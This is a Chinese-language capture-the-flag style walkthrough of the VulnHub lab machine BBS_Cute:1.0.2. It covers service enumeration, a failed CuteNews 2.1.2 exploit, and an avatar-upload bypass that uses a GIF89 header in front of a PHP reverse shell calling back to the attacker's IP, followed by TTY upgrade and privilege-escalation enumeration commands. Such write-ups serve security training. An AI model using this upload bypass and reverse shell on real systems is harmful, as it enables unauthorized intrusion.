---
title: VulnHub靶机 BBS_Cute:1.0.2 完整渗透测试复现
description: 从服务枚举、CuteNews 2.1.2 RCE 尝试、头像上传绕过（GIF89 头+PHP 反弹 Shell）到获取 Shell 及提权思路的完整实战记录
category: program-analysis
tags:
- VulnHub
- 渗透测试
- CuteNews
- 文件上传绕过
- GIF89
- 反弹Shell
- 提权
- 靶机实战
date: 2024-01-15
updated: '2026-11-14'
---

## 靶机信息

- **靶机名称**：BBS_Cute:1.0.2
- **来源**：[VulnHub](https://www.vulnhub.com/entry/bbs-cute-102,567/)
- **目标 IP**：192.168.33.142（实验环境）
- **攻击机 IP**：192.168.33.150

## 信息收集与服务枚举

### 主机发现

使用 `netdiscover` 或 `arp-scan` 发现目标主机存活。

### 端口扫描

```bash
nmap -sS -T4 -p- 192.168.33.142
```

开放端口：
- **80/tcp** - HTTP (Apache)
- **88/tcp** - HTTP (备用 Web 服务)

### 目录扫描

对 80 和 88 端口分别进行目录枚举：

```bash
# 80 端口
gobuster dir -u http://192.168.33.142 -w /usr/share/wordlists/dirb/common.txt

# 88 端口
gobuster dir -u http://192.168.33.142:88 -w /usr/share/wordlists/dirb/common.txt
```

扫描结果显示 80 端口存在典型的 CMS 结构，识别出 **CuteNews 2.1.2** 内容管理系统。

## 漏洞利用尝试：CuteNews 2.1.2 RCE

### 漏洞背景

CuteNews 2.1.2 存在已知 RCE 漏洞，Exploit-DB 编号 **48800**。

### 利用尝试

```bash
# 下载 POC
searchsploit -m 48800

# 修改 payload 后运行
python3 48800.py http://192.168.33.142/index.php
```

**结果**：利用失败，可能由于版本补丁、WAF 或环境差异导致。

> 💡 类似的 CMS 漏洞利用思路可参考 [[glasgowsmile-vulnhub-writeup]] 中的 Joomla 爆破获取 Shell 流程。

## 文件上传绕过：头像上传功能

### 发现上传点

在前台用户中心发现**头像上传**功能，支持图片文件上传。

### 绕过策略：GIF89 头 + PHP 代码

测试发现服务端校验文件头（Magic Bytes），仅允许图片格式。构造绕过 Payload：

```php
GIF89;<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.33.150';  // 攻击机 IP
$port = 4444;            // 监听端口
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

// ... 完整反弹 Shell 代码 (省略中间部分) ...

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>
```

**关键点**：
- 文件以 `GIF89;` 开头伪装成 GIF 图片
- 文件名需以 `.php` 结尾（如 `avatar_test2_revshell_pitcure.php`）
- 服务端解析 PHP 时会执行 `<?php` 后的代码

### 上传与触发

1. 上传构造好的文件
2. 访问上传后的文件路径：`http://192.168.33.142/uploads/avatar_test2_revshell_pitcure.php`

> 💡 文件上传绕过技巧在实战中高频出现，可参考 [[edu-src-penetration-test-case-study]] 中的文件上传绕过 Getshell 实战案例。

## 获取 Shell 与交互式 TTY

### 监听反弹连接

```bash
nc -lvnp 4444
```

### 反弹成功后升级 TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z 挂起
stty raw -echo; fg
reset
# 根据 stty -a 输出调整行列
stty rows 57 columns 116
```

## 权限提升尝试

### 基础枚举

```bash
# 系统信息
uname -a
cat /etc/os-release

# SUID 文件
find / -perm -u=s -type f 2>/dev/null

# sudo 权限
sudo -l

# 定时任务
crontab -l
cat /etc/crontab
ls -la /etc/cron.*

# 内核漏洞检查
# 可使用 linpeas.sh 或 linux-exploit-suggester
```

### LinPEAS 输出关键发现

![LinPEAS 结果](../Images/5e6a7047417b401e17c0ea9f623fc635.png)

从截图可见：
- 内核版本可能存在已知提权漏洞
- 存在可疑 SUID 二进制文件
- 定时任务配置可能被利用

### 后续提权思路（待复现）

1. **内核漏洞利用**：根据内核版本搜索对应 Exploit
2. **SUID 滥用**：检查异常 SUID 文件是否可利用（如 `bash -p`、自定义二进制）
3. **定时任务劫持**：可写入的定时任务脚本或路径劫持
4. **服务配置错误**：以 root 运行的服务、错误的文件权限
5. **容器逃逸**：若在容器环境中，尝试逃逸技术

> 💡 提权阶段常用工具与技巧可参考 [[vulnhub-infosecprep-oscp-writeup]] 中的 SUID bash 提权实战，以及 [[rop-linux-x86-beginner-tutorial]] 中的 Linux 提权基础知识。

## 总结与复盘

| 阶段 | 关键动作 | 结果 |
|------|----------|------|
| 信息收集 | nmap + gobuster | 发现 CuteNews 2.1.2 |
| 漏洞利用 | Exploit-DB 48800 RCE | 失败 |
| 替代路径 | 头像上传功能 | 发现上传点 |
| 绕过上传 | GIF89 头 + PHP Shell | 成功上传 |
| 获取 Shell | 访问上传文件触发反弹 | 成功获取 www-data |
| TTY 升级 | Python pty + stty | 交互式 Shell |
| 提权枚举 | LinPEAS + 手动检查 | 发现潜在提权面 |

## 相关资源与延伸阅读

- [[glasgowsmile-vulnhub-writeup]] - VulnHub 靶机 GlasgowSmile 完整复现（Joomla 爆破 + 多层编码 + 定时任务提权）
- [[vulnhub-infosecprep-oscp-writeup]] - VulnHub Infosecprep:oscp 复现（WordPress + 目录遍历 + SUID 提权）
- [[edu-src-penetration-test-case-study]] - EduSrc 实战渗透案例（文件上传绕过 + 蚁剑连接）
- [[rop-linux-x86-beginner-tutorial]] - Linux x86 ROP 与提权基础教程
- [[reverse-engineering-beginner-learning-path]] - 逆向工程学习路线（理解漏洞原理的基础）

## 参考链接

- [VulnHub BBS_Cute:1.0.2](https://www.vulnhub.com/entry/bbs-cute-102,567/)
- [Exploit-DB 48800 - CuteNews 2.1.2 RCE](https://www.exploit-db.com/exploits/48800)
- [php-reverse-shell (pentestmonkey)](https://github.com/pentestmonkey/php-reverse-shell)
- [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

## 来源

- [0x00实验室-202108-202304_020](../sources/0x00实验室-202108-202304_020.md)
